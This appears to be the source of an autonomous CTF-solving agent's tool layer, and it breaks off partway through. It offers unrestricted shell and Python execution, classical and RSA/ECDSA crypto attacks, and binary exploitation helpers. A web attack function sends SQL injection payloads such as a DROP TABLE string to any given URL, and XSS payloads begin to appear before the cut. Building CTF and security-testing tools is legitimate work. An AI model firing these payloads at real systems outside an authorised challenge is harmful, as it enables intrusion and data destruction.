#!/usr/bin/env python3
"""
CTF::SOLVER — Autonomous Sidecar
Full-spectrum solver capable of insane-difficulty challenges across all categories.
Reads JSON payload from stdin, streams events to stdout.
"""

import sys, json, subprocess, base64, urllib.parse, io, contextlib
import re, math, os, shutil, traceback, platform as _platform, socket
import hashlib, struct, itertools, time, threading, copy
from pathlib import Path
from collections import Counter, defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED

# ─── Platform ────────────────────────────────────────────────────────────────
IS_WINDOWS = _platform.system() == "Windows"

def _wsl_ok():
    if not IS_WINDOWS or not shutil.which("wsl"): return False
    try:
        r = subprocess.run(["wsl","--list","--quiet"], capture_output=True,
                           text=True, encoding="utf-16-le", timeout=5)
        return r.returncode == 0 and bool(r.stdout.strip())
    except: return False

USE_WSL = _wsl_ok()

def _w2l(p):
    if len(p) >= 2 and p[1] == ":":
        return f"/mnt/{p[0].lower()}{p[2:].replace(chr(92),'/')}"
    return p.replace("\\","/")

# ─── Emit / Log ──────────────────────────────────────────────────────────────
def emit(t, **kw): kw["type"]=t; print(json.dumps(kw,ensure_ascii=False),flush=True)
def log(tag,msg,cls=""): emit("log",tag=tag,msg=str(msg),cls=cls)
def result(status,flag=None,workspace=None):
    emit("result",status=status,flag=flag,workspace=workspace)

# ─── Shell execution (WSL-aware) ──────────────────────────────────────────────
def _shell(cmd, timeout=60, env=None):
    if IS_WINDOWS and USE_WSL:
        safe = cmd.replace("'","'\\''")
        args = ["wsl","bash","-c",safe]
    elif IS_WINDOWS:
        args = cmd; cmd = None
    else:
        args = ["bash", "-c", cmd]

    try:
        p = subprocess.run(
            args, shell=(cmd is not None), capture_output=True,
            text=True, encoding="utf-8", errors="replace",
            timeout=timeout, env=env
        )
        out = p.stdout + ("\n[stderr]\n"+p.stderr if p.stderr.strip() else "")
        out = out.strip() or f"(exit {p.returncode}, no output)"
        return out[:8000] if len(out)<=8000 else out[:4000]+"\n...[truncated]...\n"+out[-3000:]
    except subprocess.TimeoutExpired: return f"Timed out after {timeout}s"
    except Exception as e: return f"Shell error: {e}"

# ──────────────────────────────────────────────────────────────────────────────
# TOOL IMPLEMENTATIONS
# ──────────────────────────────────────────────────────────────────────────────

def tool_execute_shell(command, timeout=60, working_dir=None):
    prefix = "[WSL] " if IS_WINDOWS and USE_WSL else "[cmd] " if IS_WINDOWS else ""
    log("sys", f"{prefix}$ {command}", "dim")
    if working_dir:
        command = f"cd '{working_dir}' && {command}"
    return _shell(command, timeout=timeout)

def tool_execute_python(code, timeout=60):
    log("sys", "Running Python snippet...", "dim")
    buf_o, buf_e = io.StringIO(), io.StringIO()
    try:
        with contextlib.redirect_stdout(buf_o), contextlib.redirect_stderr(buf_e):
            exec(compile(code,"<solver>","exec"), {"__builtins__":__builtins__}, {})
        out = buf_o.getvalue()
        err = buf_e.getvalue()
        full = (out + ("\n[stderr]\n"+err if err.strip() else "")).strip()
        return full or "(executed — no output)"
    except Exception as ex:
        return f"{type(ex).__name__}: {ex}\n{traceback.format_exc()}\n{buf_e.getvalue()}".strip()

def tool_decode_transform(text, method, key=None, key2=None):
    """Comprehensive encoding/decoding including classical ciphers."""
    try:
        t = text

        if method == "base64_decode":
            p = t.strip(); p += "="*(4-len(p)%4)
            return base64.b64decode(p).decode("utf-8",errors="replace")
        if method == "base64_encode":
            return base64.b64encode(t.encode()).decode()
        if method == "base64url_decode":
            p = t.strip().replace("-","+").replace("_","/"); p += "="*(4-len(p)%4)
            return base64.b64decode(p).decode("utf-8",errors="replace")
        if method == "hex_decode":
            return bytes.fromhex(re.sub(r"[^0-9a-fA-F]","",t)).decode("utf-8",errors="replace")
        if method == "hex_encode": return t.encode().hex()
        if method == "rot13":
            import codecs; return codecs.encode(t,"rot_13")
        if method == "rot_n":
            n = int(key or 13)
            return "".join(chr((ord(c)-ord("A")+n)%26+ord("A")) if c.isupper()
                           else chr((ord(c)-ord("a")+n)%26+ord("a")) if c.islower()
                           else c for c in t)
        if method == "url_decode": return urllib.parse.unquote(t)
        if method == "url_encode": return urllib.parse.quote(t)
        if method == "html_decode":
            import html; return html.unescape(t)
        if method == "binary_to_text":
            bits = re.sub(r"[^01]","",t)
            return "".join(chr(int(bits[i:i+8],2)) for i in range(0,len(bits)-7,8))
        if method == "text_to_binary":
            return " ".join(format(ord(c),"08b") for c in t)
        if method == "xor":
            if not key: return "XOR requires a key"
            kb = bytes.fromhex(key) if all(c in "0123456789abcdefABCDEF" for c in key) and len(key)%2==0 else key.encode()
            tb = t.encode()
            r = bytes([tb[i]^kb[i%len(kb)] for i in range(len(tb))])
            return r.decode("utf-8",errors="replace") + f"\n(hex: {r.hex()})"
        if method == "xor_hex":
            a = bytes.fromhex(re.sub(r"[^0-9a-fA-F]","",t))
            b = bytes.fromhex(re.sub(r"[^0-9a-fA-F]","",key or ""))
            r = bytes([a[i]^b[i%len(b)] for i in range(len(a))])
            return r.hex() + "\n(ascii: " + r.decode("utf-8",errors="replace") + ")"
        if method == "caesar":
            return "".join(chr((ord(c)-ord("A")+int(key or 13))%26+ord("A")) if c.isupper()
                          else chr((ord(c)-ord("a")+int(key or 13))%26+ord("a")) if c.islower()
                          else c for c in t)
        if method == "caesar_bruteforce":
            results = []
            for shift in range(1,26):
                dec = "".join(chr((ord(c)-ord("A")+shift)%26+ord("A")) if c.isupper()
                              else chr((ord(c)-ord("a")+shift)%26+ord("a")) if c.islower()
                              else c for c in t)
                results.append(f"ROT{shift}: {dec}")
            return "\n".join(results)
        if method == "atbash":
            return "".join(chr(ord("A")+25-(ord(c)-ord("A"))) if c.isupper()
                          else chr(ord("a")+25-(ord(c)-ord("a"))) if c.islower()
                          else c for c in t)
        if method == "vigenere_decode":
            if not key: return "Vigenere requires a key"
            key_u = key.upper(); i = 0; out = []
            for c in t:
                if c.isalpha():
                    shift = ord(key_u[i%len(key_u)])-ord("A")
                    base = ord("A") if c.isupper() else ord("a")
                    out.append(chr((ord(c)-base-shift)%26+base)); i+=1
                else: out.append(c)
            return "".join(out)
        if method == "vigenere_encode":
            if not key: return "Vigenere requires a key"
            key_u = key.upper(); i = 0; out = []
            for c in t:
                if c.isalpha():
                    shift = ord(key_u[i%len(key_u)])-ord("A")
                    base = ord("A") if c.isupper() else ord("a")
                    out.append(chr((ord(c)-base+shift)%26+base)); i+=1
                else: out.append(c)
            return "".join(out)
        if method == "morse_decode":
            TABLE = {".-":"A","-...":"B","-.-.":"C","-..":"D",".":"E","..-.":"F",
                     "--.":"G","....":"H","..":"I",".---":"J","-.-":"K",".-..":"L",
                     "--":"M","-.":"N","---":"O",".--.":"P","--.-":"Q",".-.":"R",
                     "...":"S","-":"T","..-":"U","...-":"V",".--":"W","-..-":"X",
                     "-.--":"Y","--..":"Z","-----":"0",".----":"1","..---":"2",
                     "...--":"3","....-":"4",".....":"5","-....":"6","--...":"7",
                     "---..":"8","----.":"9"}
            return " ".join(TABLE.get(w,"?") for w in t.strip().split())
        if method == "base32_decode":
            import base64 as b64
            p = t.strip().upper(); p += "="*((8-len(p)%8)%8)
            return b64.b32decode(p).decode("utf-8",errors="replace")
        if method == "base58_decode":
            ALPHA = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
            n = sum(ALPHA.index(c)*58**i for i,c in enumerate(reversed(t.strip())))
            result_bytes = []
            while n: result_bytes.append(n%256); n//=256
            return bytes(reversed(result_bytes)).decode("utf-8",errors="replace")
        if method == "int_to_bytes":
            n = int(t.strip()); length = (n.bit_length()+7)//8
            return n.to_bytes(length,"big").decode("utf-8",errors="replace")
        if method == "bytes_to_int":
            return str(int.from_bytes(t.encode(),"big"))
        if method == "frequency_analysis":
            only_alpha = re.sub(r"[^a-zA-Z]","",t).upper()
            freq = Counter(only_alpha)
            total = len(only_alpha)
            EN_FREQ = "ETAOINSHRDLCUMWFGYPBVKJXQZ"
            sorted_chars = [c for c,_ in freq.most_common()]
            lines = [f"Frequency analysis (total letters: {total}):"]
            for c,count in freq.most_common(10):
                lines.append(f"  {c}: {count} ({100*count/total:.1f}%) — likely {EN_FREQ[sorted_chars.index(c)] if sorted_chars.index(c)<len(EN_FREQ) else '?'}")
            lines.append(f"\nExpected English order: {EN_FREQ[:10]}")
            lines.append(f"Observed order:         {''.join(sorted_chars[:10])}")
            return "\n".join(lines)
        if method == "detect_encoding":
            results = ["Encoding detection:"]
            # Base64
            try:
                p = t.strip(); p += "="*(4-len(p)%4)
                d = base64.b64decode(p)
                results.append(f"  Base64: {d[:80]}")
            except: pass
            # Hex
            try:
                clean = re.sub(r"[^0-9a-fA-F]","",t)
                if len(clean)%2==0 and len(clean)>=8:
                    d = bytes.fromhex(clean)
                    results.append(f"  Hex: {d[:80]}")
            except: pass
            # Binary
            bits = re.sub(r"[^01 ]","",t)
            if len(re.sub(r" ","",bits))%8==0:
                try:
                    d = bytes([int(bits.split()[i] if ' ' in bits else bits[i*8:(i+1)*8],2)
                               for i in range(len(re.sub(r" ","",bits))//8)])
                    results.append(f"  Binary: {d[:80]}")
                except: pass
            # ASCII codes
            try:
                nums = [int(x) for x in re.split(r"[\s,]+",t.strip()) if x.isdigit()]
                if nums and all(0<=n<=127 for n in nums):
                    results.append(f"  ASCII codes: {''.join(chr(n) for n in nums)}")
            except: pass
            return "\n".join(results) if len(results)>1 else "No common encoding detected"
        return f"Unknown method: {method}"
    except Exception as e:
        return f"Decode error ({method}): {e}"

def tool_crypto_attack(attack, **params):
    """Dedicated crypto attacks — RSA variants, padding oracle, hash extension, PRNG."""
    try:
        attack = attack.lower()

        if attack == "rsa_small_e":
            # RSA with small public exponent — try eth root
            n = int(params.get("n",0)); e = int(params.get("e",3))
            c = int(params.get("c",0))
            code = f"""
from gmpy2 import iroot
import gmpy2
n,e,c = {n},{e},{c}
# Try direct eth root first (m^e < n)
root,exact = iroot(c,e)
if exact:
    print("Direct eth root:", root)
    m_bytes = root.to_bytes((root.bit_length()+7)//8,'big')
    print("Plaintext:", m_bytes)
else:
    # Hastad broadcast / add multiples of n
    for k in range(2000):
        candidate = c + k*n
        root,exact = iroot(candidate,e)
        if exact:
            print(f"Found at k={k}: m={root}")
            m_bytes = root.to_bytes((root.bit_length()+7)//8,'big')
            print("Plaintext:", m_bytes)
            break
    else:
        print("eth root failed — try Coppersmith or different approach")
"""
            return tool_execute_python(code)

        if attack == "rsa_wiener":
            n = int(params.get("n",0)); e = int(params.get("e",0))
            code = f"""
from fractions import Fraction
def wiener(e,n):
    def cf(n,d):
        while d:
            yield n//d
            n,d=d,n%d
    def convergents(cf_list):
        n0,n1,d0,d1=0,1,1,0
        for a in cf_list:
            n0,n1=n1,a*n1+n0
            d0,d1=d1,a*d1+d0
            yield n1,d1
    for k,d in convergents(list(cf({e},{n}))):
        if k==0: continue
        if ({e}*d-1)%k: continue
        phi=({e}*d-1)//k
        b=-(({n}-phi+1))
        disc=b*b-4*{n}
        if disc<0: continue
        import math
        sq=int(math.isqrt(disc))
        if sq*sq==disc and ((-b+sq)%2==0):
            p,q=(-b+sq)//2,(-b-sq)//2
            if p*q=={n}: return d,p,q
    return None
result=wiener({e},{n})
if result:
    d,p,q=result
    print(f"Wiener attack succeeded! d={{d}}, p={{p}}, q={{q}}")
    c=int('{params.get("c",0)}')
    if c: print("Plaintext int:", pow(c,d,{n}))
else:
    print("Wiener failed — d may not be small enough")
"""
            return tool_execute_python(code)

        if attack == "rsa_factor_known_phi":
            n = int(params.get("n",0)); e = int(params.get("e",65537)); c = int(params.get("c",0))
            phi = int(params.get("phi",0))
            code = f"""
import math
n,e,phi,c={n},{e},{phi},{c}
# Recover p,q from n and phi
# phi = (p-1)(q-1) = n - p - q + 1, so p+q = n - phi + 1
s=n-phi+1; disc=s*s-4*n
sq=int(disc**0.5)
for sq2 in [sq-1,sq,sq+1]:
    if sq2*sq2==disc:
        p,q=(s+sq2)//2,(s-sq2)//2
        if p*q==n:
            d=pow(e,-1,phi)
            m=pow(c,d,n)
            print(f"p={{p}}, q={{q}}, d={{d}}")
            print("Plaintext:", m.to_bytes((m.bit_length()+7)//8,'big'))
            break
else:
    print("Could not recover factors from phi")
"""
            return tool_execute_python(code)

        if attack == "rsa_common_modulus":
            n = int(params.get("n",0)); e1 = int(params.get("e1",0)); e2 = int(params.get("e2",0))
            c1 = int(params.get("c1",0)); c2 = int(params.get("c2",0))
            code = f"""
from math import gcd
def egcd(a,b):
    if b==0: return a,1,0
    g,x,y=egcd(b,a%b); return g,y,x-a//b*y
n,e1,e2,c1,c2={n},{e1},{e2},{c1},{c2}
g,s,t=egcd(e1,e2)
if g!=1: print("GCD not 1, cannot directly attack")
else:
    if s<0: c1=pow(c1,-1,n); s=-s
    if t<0: c2=pow(c2,-1,n); t=-t
    m=pow(c1,s,n)*pow(c2,t,n)%n
    print("Plaintext int:",m)
    print("Plaintext bytes:",m.to_bytes((m.bit_length()+7)//8,'big'))
"""
            return tool_execute_python(code)

        if attack == "rsa_lsb_oracle":
            # LSB oracle / parity oracle attack
            return "LSB oracle attack: use execute_python with pwntools to interact with the oracle server, halving the plaintext range each query until m is recovered."

        if attack == "cbc_padding_oracle":
            return tool_execute_python(f"""
# CBC Padding Oracle attack skeleton
# Requires: oracle function that returns True if padding is valid
# Usage: implement oracle(), then call padding_oracle_decrypt(ciphertext, block_size, oracle)
def padding_oracle_decrypt(ciphertext, block_size, oracle):
    blocks = [ciphertext[i:i+block_size] for i in range(0,len(ciphertext),block_size)]
    plaintext = b""
    for bi in range(1,len(blocks)):
        ct_block = blocks[bi]; prev_block = bytearray(blocks[bi-1])
        intermediate = bytearray(block_size)
        for byte_pos in range(block_size-1,-1,-1):
            pad_val = block_size - byte_pos
            for guess in range(256):
                modified_prev = bytearray(prev_block)
                modified_prev[byte_pos] = guess
                for k in range(byte_pos+1,block_size):
                    modified_prev[k] = intermediate[k] ^ pad_val
                if oracle(bytes(modified_prev) + ct_block):
                    if byte_pos==block_size-1:
                        # Verify it's not a fluke
                        modified_prev[byte_pos-1] ^= 1
                        if not oracle(bytes(modified_prev)+ct_block): continue
                    intermediate[byte_pos] = guess ^ pad_val
                    break
        plaintext += bytes(x^y for x,y in zip(intermediate,prev_block))
    return plaintext
print("Padding oracle template ready. Implement oracle() and call padding_oracle_decrypt().")
print("Example: oracle = lambda ct: requests.post(url, data=ct).text != 'Invalid padding'")
""")

        if attack == "hash_length_extension":
            algo = params.get("algo","sha256"); secret_len = int(params.get("secret_len",0))
            known_hash = params.get("known_hash",""); known_msg = params.get("known_msg","")
            append_msg = params.get("append_msg","")
            return tool_execute_shell(f"hash_extender --data '{known_msg}' --secret {secret_len} --append '{append_msg}' --signature '{known_hash}' --format {algo} 2>/dev/null || echo 'hash_extender not found — try: pip install hashpumpy'")

        if attack == "aes_ecb_byte_at_a_time":
            return "ECB byte-at-a-time: use execute_python to implement oracle calls, detect block size, then brute-force one byte at a time by crafting blocks where only the last byte is unknown."

        if attack == "mt19937_crack":
            # Mersenne Twister crack from 624 outputs
            return tool_execute_python("""
# MT19937 crack — needs 624 consecutive 32-bit outputs
# Install randcrack: pip install randcrack
try:
    from randcrack import RandCrack
    rc = RandCrack()
    # Feed 624 outputs: rc.submit(output)
    # Then predict: rc.predict_randbelow(N) or rc.predict_getrandbits(32)
    print("randcrack available. Feed 624 outputs via rc.submit(), then predict.")
except ImportError:
    print("Install randcrack: pip install randcrack")
    print("Manual approach: implement MT state recovery from 624 32-bit outputs")
""")

        if attack == "ecdsa_nonce_reuse":
            code = f"""
# ECDSA nonce reuse attack (same k used twice)
# Given: r1==r2 (same nonce), two signatures (r,s1),(r,s2), two messages m1,m2
# k = (m1-m2) * modinv(s1-s2, n)
# privkey = (s1*k - m1) * modinv(r, n)
from hashlib import sha256
import json
params = {json.dumps(params)}
r=int(params.get('r',0)); s1=int(params.get('s1',0)); s2=int(params.get('s2',0))
m1=int(params.get('m1',0)); m2=int(params.get('m2',0)); n=int(params.get('n',0))
if r and s1 and s2 and m1 and m2 and n:
    def modinv(a,m):
        return pow(a,-1,m)
    k = (m1-m2)*modinv(s1-s2,n)%n
    privkey = (s1*k-m1)*modinv(r,n)%n
    print(f"k = {{k}}")
    print(f"Private key = {{privkey}}")
else:
    print("Provide r,s1,s2,m1,m2,n (all as integers)")
"""
            return tool_execute_python(code)

        if attack == "xor_key_length":
            # Kasiski / IC analysis for key length
            ciphertext = params.get("ciphertext","")
            code = f"""
import itertools, base64
ct_hex = '{ciphertext}'
try:
    ct = bytes.fromhex(ct_hex)
except:
    try: ct = base64.b64decode(ct_hex + '==')
    except: ct = ct_hex.encode()

def ic(text):
    n=len(text); freq=dict()
    for b in text: freq[b]=freq.get(b,0)+1
    return sum(f*(f-1) for f in freq.values())/(n*(n-1)) if n>1 else 0

results=[]
for keylen in range(1,33):
    blocks=[ct[i::keylen] for i in range(keylen)]
    avg_ic=sum(ic(b) for b in blocks)/len(blocks)
    results.append((keylen,avg_ic))

results.sort(key=lambda x:-x[1])
print("Key length candidates (by Index of Coincidence, higher=better):")
for kl,ic_val in results[:8]:
    print(f"  Length {{kl:3d}}: IC={{ic_val:.4f}}")
print("\\nEnglish IC ≈ 0.065, random IC ≈ 0.038")
"""
            return tool_execute_python(code)

        return f"Unknown attack: {attack}. Available: rsa_small_e, rsa_wiener, rsa_factor_known_phi, rsa_common_modulus, rsa_lsb_oracle, cbc_padding_oracle, hash_length_extension, aes_ecb_byte_at_a_time, mt19937_crack, ecdsa_nonce_reuse, xor_key_length"

    except Exception as e:
        return f"Crypto attack error: {e}\n{traceback.format_exc()}"

def tool_http_request(url, method="GET", headers=None, data=None, json_data=None,
                      cookies=None, follow_redirects=True, verify_ssl=False, timeout=20):
    try:
        import requests; requests.packages.urllib3.disable_warnings()
        kwargs = dict(headers=headers or {}, cookies=cookies or {},
                      timeout=timeout, allow_redirects=follow_redirects, verify=verify_ssl)
        if json_data: kwargs["json"] = json_data
        elif data:    kwargs["data"] = data
        resp = requests.request(method.upper(), url, **kwargs)
        body = resp.text
        if len(body)>6000: body=body[:3000]+"\n...[truncated]...\n"+body[-2000:]
        return (f"HTTP {resp.status_code} {resp.reason}\n"
                f"URL: {resp.url}\n"
                f"Headers: {dict(resp.headers)}\n\n"
                f"Body:\n{body}")
    except ImportError: return "pip install requests"
    except Exception as e: return f"HTTP error: {e}"

def tool_concurrent_requests(requests_list, workers=50, timeout=5):
    """Fire many HTTP requests in parallel — useful for timing attacks, cache probing, fuzzing."""
    try:
        import requests as req; req.packages.urllib3.disable_warnings()
        session = req.Session()
        results = []

        def do_req(item):
            url = item.get("url","")
            method = item.get("method","GET")
            label = item.get("label", url)
            try:
                r = session.request(method, url,
                    headers=item.get("headers",{}),
                    data=item.get("data"),
                    cookies=item.get("cookies",{}),
                    timeout=timeout, verify=False,
                    allow_redirects=item.get("follow_redirects",True))
                return {"label":label,"status":r.status_code,"size":len(r.content),
                        "time":r.elapsed.total_seconds(),"body":r.text[:200]}
            except Exception as e:
                return {"label":label,"status":-1,"error":str(e)}

        with ThreadPoolExecutor(max_workers=min(workers,len(requests_list))) as ex:
            futures = {ex.submit(do_req,item): item for item in requests_list}
            for fut in as_completed(futures):
                results.append(fut.result())

        # Summarise
        by_status = Counter(r.get("status",-1) for r in results)
        lines = [f"Completed {len(results)}/{len(requests_list)} requests"]
        lines.append(f"Status codes: {dict(by_status)}")
        if len(results) <= 30:
            for r in sorted(results, key=lambda x: x.get("status",0)):
                lines.append(f"  [{r['status']}] {r['label']} {r.get('body','')[:80]}")
        else:
            # Show interesting ones (non-common status)
            common = by_status.most_common(1)[0][0]
            interesting = [r for r in results if r.get("status") != common][:20]
            lines.append(f"\nInteresting (non-{common}):")
            for r in interesting:
                lines.append(f"  [{r['status']}] {r['label']} {r.get('body','')[:80]}")
        return "\n".join(lines)
    except ImportError: return "pip install requests"
    except Exception as e: return f"Concurrent request error: {e}"

def tool_tcp_connect(host, port, data=None, data_hex=None, timeout=10,
                     read_until=None, interactive_script=None):
    """
    Raw TCP connection. Supports sending data, reading response, pwntools-style interaction.
    For complex pwn challenges, use execute_python with pwntools instead.
    """
    try:
        if interactive_script:
            # Use pwntools for interactive
            code = f"""
from pwn import *
context.log_level = 'info'
io = remote('{host}', {port}, timeout={timeout})
{interactive_script}
io.close()
"""
            return tool_execute_python(code)

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, int(port)))
        banner = b""
        s.settimeout(2)
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk: break
                banner += chunk
        except: pass

        if data_hex: send_data = bytes.fromhex(data_hex.replace(" ",""))
        elif data:   send_data = data.encode() if isinstance(data,str) else data
        else:        send_data = None

        if send_data:
            s.settimeout(timeout)
            s.sendall(send_data)
            s.settimeout(2)
            resp = b""
            try:
                while True:
                    chunk = s.recv(4096)
                    if not chunk: break
                    resp += chunk
            except: pass
            s.close()
            return (f"Banner:\n{banner.decode('utf-8',errors='replace')}\n\n"
                    f"Response:\n{resp.decode('utf-8',errors='replace')}")
        s.close()
        return banner.decode("utf-8",errors="replace") or "(no banner)"
    except Exception as e: return f"TCP error: {e}"

def tool_analyze_file(path, operation):
    """File analysis — type detection, strings, hex, entropy, steg, PCAP, metadata."""
    try:
        sp = _w2l(path) if (IS_WINDOWS and USE_WSL) else path
        if not os.path.exists(path) and not (IS_WINDOWS and USE_WSL):
            return f"File not found: {path}"

        if operation == "file_type":
            return _shell(f"file '{sp}' && wc -c '{sp}'")
        if operation == "strings":
            return _shell(f"strings -n 8 '{sp}' | head -300")
        if operation == "strings_all":
            return _shell(f"strings -n 4 '{sp}'")
        if operation == "hexdump":
            out = _shell(f"xxd '{sp}' | head -100")
            if "not found" in out.lower():
                with open(path,"rb") as f: data=f.read(1600)
                lines=[f"{i:08x}  {' '.join(f'{b:02x}' for b in data[i:i+16]):<48}  "
                       f"{''.join(chr(b) if 32<=b<127 else '.' for b in data[i:i+16])}"
                       for i in range(0,len(data),16)]
                return "\n".join(lines)
            return out
        if operation == "hexdump_full":
            return _shell(f"xxd '{sp}'")
        if operation == "metadata":
            return _shell(f"exiftool '{sp}' 2>/dev/null || file '{sp}'")
        if operation == "entropy":
            with open(path,"rb") as f: data=f.read()
            if not data: return "Empty file"
            counts=Counter(data)
            ent=-sum((c/len(data))*math.log2(c/len(data)) for c in counts.values())
            # Block entropy
            block_sz=256; block_ents=[]
            for i in range(0,len(data),block_sz):
                blk=data[i:i+block_sz]
                bc=Counter(blk); be=-sum((c/len(blk))*math.log2(c/len(blk)) for c in bc.values())
                block_ents.append(be)
            high_blocks=[(i,e) for i,e in enumerate(block_ents) if e>7.0]
            return (f"Entropy: {ent:.4f} bits/byte | Size: {len(data)} bytes\n"
                    f">7.5 = encrypted/compressed | <3 = plaintext\n"
                    f"High-entropy blocks: {high_blocks[:10]}")
        if operation == "binwalk":
            return _shell(f"binwalk '{sp}'")
        if operation == "binwalk_extract":
            return _shell(f"binwalk -e '{sp}' && ls -la _*/ 2>/dev/null")
        if operation == "steg_lsb":
            lsb_code = """
from PIL import Image
import numpy as np, re
try:
    img = Image.open(r'__PATH__')
    arr = np.array(img)
    lsbs = arr.flatten() & 1
    bits = ''.join(str(b) for b in lsbs)
    result = bytes(int(bits[i:i+8],2) for i in range(0,len(bits)-7,8))
    printable = result[:500]
    print("LSB data (first 500 bytes):", printable)
    print("As text:", printable.decode('utf-8',errors='replace'))
    flags = re.findall(rb'[a-zA-Z]{2,10}\\{[^}]{1,50}\\}', result)
    if flags: print("FLAGS FOUND:", flags)
except Exception as e:
    print(f"PIL error: {e} — try: pip install Pillow numpy")
""".replace("__PATH__", path)
            return tool_execute_python(lsb_code)
        if operation == "steg_tools":
            out = _shell(f"steghide info '{sp}' 2>&1; echo '---'; zsteg '{sp}' 2>/dev/null | head -30; echo '---'; stegseek '{sp}' 2>/dev/null")
            return out
        if operation == "pcap_summary":
            return _shell(f"tshark -r '{sp}' -q -z conv,tcp 2>/dev/null | head -40; echo '---'; tshark -r '{sp}' -q -z io,phs 2>/dev/null")
        if operation == "pcap_strings":
            return _shell(f"tshark -r '{sp}' -Y 'http or ftp or smtp' -T fields -e text 2>/dev/null | head -50; strings '{sp}' | grep -iE 'flag|ctf|pass|key|secret' | head -20")
        if operation == "pcap_http":
            return _shell(f"tshark -r '{sp}' -Y http -T fields -e http.request.method -e http.request.uri -e http.response.code -e http.file_data 2>/dev/null | head -50")
        if operation == "zip_crack":
            return _shell(f"zip2john '{sp}' > /tmp/zip.hash 2>/dev/null && john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/zip.hash")
        if operation == "pdf_extract":
            return _shell(f"pdftotext '{sp}' - 2>/dev/null | head -100; strings '{sp}' | grep -i flag")
        if operation == "magic_bytes":
            with open(path,"rb") as f: header=f.read(32)
            sigs = {b'\x89PNG':'.png',b'\xff\xd8\xff':'.jpg',b'GIF8':'.gif',
                    b'PK\x03\x04':'.zip',b'%PDF':'.pdf',b'\x7fELF':'.elf',
                    b'MZ':'.exe',b'BM':'.bmp',b'OggS':'.ogg',b'\x1f\x8b':'.gz',
                    b'BZh':'.bz2',b'\xfd7zXZ':'.xz',b'7z\xbc\xaf':'.7z',
                    b'Rar!':'.rar',b'\x00\x00\x00 ftyp':'.mp4'}
            detected = [ext for sig,ext in sigs.items() if header.startswith(sig)]
            return f"Magic bytes: {header.hex()}\nDetected type: {detected or 'unknown'}\nHeader ASCII: {header.decode('ascii',errors='replace')}"
        return f"Unknown operation. Available: file_type,strings,strings_all,hexdump,hexdump_full,metadata,entropy,binwalk,binwalk_extract,steg_lsb,steg_tools,pcap_summary,pcap_strings,pcap_http,zip_crack,pdf_extract,magic_bytes"
    except Exception as e: return f"File analysis error: {e}"

def tool_binary_analysis(path, operation, args=None):
    """Advanced binary analysis — disassembly, decompilation, checksec, GDB."""
    sp = _w2l(path) if (IS_WINDOWS and USE_WSL) else path
    args = args or ""
    if operation == "checksec":
        return _shell(f"checksec --file='{sp}' 2>/dev/null || python3 -c \"import pwn; print(pwn.ELF('{sp}').checksec())\" 2>/dev/null")
    if operation == "disassemble":
        return _shell(f"objdump -d -M intel '{sp}' | head -200")
    if operation == "disassemble_func":
        return _shell(f"objdump -d -M intel '{sp}' | grep -A 100 '<{args}>:' | head -60")
    if operation == "functions":
        return _shell(f"nm '{sp}' 2>/dev/null; objdump -t '{sp}' 2>/dev/null | grep -i 'F\\|f' | head -40")
    if operation == "plt_got":
        return _shell(f"objdump -d '{sp}' | grep -A3 '@plt'")
    if operation == "decompile_r2":
        return _shell(f"r2 -q -c 'aaa; s main; pdf' '{sp}' 2>/dev/null || echo 'r2 not found'", timeout=30)
    if operation == "decompile_ghidra":
        return _shell(f"ghidra_headless /tmp ghidra_tmp -import '{sp}' -postScript DecompileScript.java -deleteProject 2>/dev/null | head -100 || echo 'Ghidra headless not configured'", timeout=120)
    if operation == "rop_gadgets":
        return _shell(f"ROPgadget --binary '{sp}' --rop 2>/dev/null | head -60 || ropper -f '{sp}' 2>/dev/null | head -60")
    if operation == "rop_find":
        return _shell(f"ROPgadget --binary '{sp}' --rop --re '{args}' 2>/dev/null | head -30")
    if operation == "libc_version":
        return _shell(f"strings '{sp}' | grep 'GNU C Library'; ldd '{sp}' 2>/dev/null")
    if operation == "gdb_run":
        script = args or "run\nbt\ninfo registers\nq"
        with open("/tmp/gdb_script.txt","w") as f: f.write(script)
        return _shell(f"gdb -batch -x /tmp/gdb_script.txt '{sp}' 2>&1 | head -80", timeout=30)
    if operation == "pwndbg_cyclic":
        length = int(args or 200)
        return tool_execute_python(f"""
from pwn import cyclic, cyclic_find
pattern = cyclic({length})
print("Cyclic pattern:", pattern.decode())
print("\\nTo find offset after crash: cyclic_find(0x<crash_addr>)")
""")
    if operation == "format_string_offsets":
        return tool_execute_python("""
# Format string offset finder skeleton
# Connect to service and send %p%p%p... to find stack offsets
from pwn import *
# io = remote('host', port)  or  io = process('./binary')
# io.sendline(('%{}$p'.format(i)).encode()) to test each offset
print("Format string offset testing:")
print("Send: %1$p.%2$p.%3$p.%4$p.%5$p to see first 5 stack values")
print("When you see your input on the stack = that is your offset")
print("Then: %<offset>$s to read strings, %<offset>$n to write")
""")
    if operation == "heap_analysis":
        return _shell(f"gdb -batch -ex 'run' -ex 'heap chunks' -ex 'heap bins' '{sp}' 2>/dev/null | head -60")
    return f"Unknown operation. Available: checksec,disassemble,disassemble_func,functions,plt_got,decompile_r2,rop_gadgets,rop_find,libc_version,gdb_run,pwndbg_cyclic,format_string_offsets,heap_analysis"

def tool_web_attack(attack, target_url, **params):
    """Web-specific attack primitives."""
    try:
        if attack == "sql_injection_test":
            payloads = ["'","\"","' OR '1'='1","' OR 1=1--","' UNION SELECT NULL--",
                        "'; DROP TABLE users--","1' AND SLEEP(5)--","1 AND 1=1",
                        "' OR SLEEP(5)--","admin'--","' OR '1'='1'--"]
            code = f"""
import requests, time
url = '{target_url}'
param = '{params.get("param","q")}'
results = []
session = requests.Session()
for payload in {payloads}:
    try:
        start=time.time()
        r=session.get(url,params={{param:payload}},timeout=10,verify=False)
        elapsed=time.time()-start
        if elapsed>4: results.append(f"TIME-BASED: {{repr(payload)}} took {{elapsed:.1f}}s")
        elif any(x in r.text.lower() for x in ['error','syntax','sql','warning','mysql','sqlite','postgresql']):
            results.append(f"ERROR-BASED: {{repr(payload)}} -> {{r.text[:100]}}")
        elif r.status_code!=200: results.append(f"STATUS {{r.status_code}}: {{repr(payload)}}")
    except Exception as e: results.append(f"Exception: {{e}}")
for r in results: print(r)
if not results: print("No obvious SQLi detected with basic payloads")
"""
            return tool_execute_python(code)

        if attack == "xss_test":
            payloads = ['<script>alert(1)</script>','"><script>alert(1)</script>',
